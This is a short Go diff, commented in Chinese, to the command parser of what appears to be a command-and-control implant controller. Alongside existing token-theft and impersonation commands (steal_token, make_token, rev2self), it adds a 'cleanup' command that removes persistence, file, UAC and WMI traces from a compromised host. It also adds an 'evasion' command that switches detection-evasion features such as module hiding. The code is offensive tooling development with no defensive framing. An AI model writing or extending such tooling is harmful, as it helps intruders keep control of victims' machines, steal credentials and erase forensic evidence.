@@ -94,6 +94,10 @@ var commandTable = []cmdSpec{
 	// Token 操作链（A8）
 	{prefix: "make_token ", typ: command1.MAKE_TOKEN, build: rawArg},
 	{prefix: "steal_token ", typ: command1.STEAL_TOKEN, build: rawArg},
+	// 清理现场（P1）：cleanup [all|persist|files|uac|wmi]
+	{prefix: "cleanup ", typ: command1.CLEANUP, build: rawArg},
+	// 对抗能力开关（P4）：evasion [status|reset|all on|off|on <能力>|off <能力>]
+	{prefix: "evasion ", typ: command1.EVASION, build: rawArg},
 }
 
 // exactCommands 精确匹配的无参命令
@@ -129,6 +133,10 @@ var exactCommands = map[string]uint32{
 	"kerberos": command1.KERB_ACTION,
 	// Token 操作链（A8）：make_token/steal_token 带参数走前缀表
 	"rev2self": command1.REV2SELF,
+	// 清理现场（P1）：不带参数 = 全范围清理
+	"cleanup": command1.CLEANUP,
+	// 对抗能力开关（P4）：不带参数 = 状态；"evasion on modhide" 走前缀表
+	"evasion": command1.EVASION,
 }
 
 // resolveCommand 将命令字符串解析为待发送字节（4 字节类型头 + payload）。
